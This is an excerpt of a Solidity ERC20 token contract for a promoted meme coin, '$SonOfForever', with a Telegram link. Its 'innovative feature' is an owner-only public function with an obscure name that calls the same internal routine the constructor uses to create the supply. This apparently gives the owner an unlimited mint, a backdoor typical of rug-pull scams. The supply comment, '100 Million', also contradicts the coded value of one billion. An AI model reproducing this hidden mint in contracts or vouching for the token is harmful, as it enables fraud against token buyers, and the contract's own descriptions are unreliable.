...
//
// $SonOfForever proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/SonOfForever
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _sonofforever(uint256 amount) public onlyOwner {
    _sonofforever(msg.sender, amount);
    }
    ...
    function _sonofforever(address account, uint256 amount) internal virtual {
...
contract $SonOfForever is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Son Of Forever", "SONOFFOREVER") {
        _sonofforever(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}